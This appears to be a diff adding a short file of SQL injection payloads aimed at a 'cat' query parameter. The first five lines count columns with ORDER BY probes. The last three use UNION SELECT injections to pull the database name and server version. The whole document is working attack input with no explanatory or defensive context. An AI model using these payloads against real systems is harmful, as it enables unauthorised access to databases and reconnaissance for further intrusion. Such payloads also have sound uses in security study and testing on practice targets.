@@ -1,0 +1,8 @@
+cat=1 order by 1 --
+cat=1 order by 2 --
+cat=1 order by 3 --
+cat=1 order by 4 --
+cat=1 order by 5 --
+cat=1 union select 1,2,3,4,5,6,7,8,9,10,11--
+cat=1 union select 1,2,3,4,5,6,database(),8,9,10,11--
+cat=1 union select 1,2,3,4,5,6,version(),8,9,10,11--
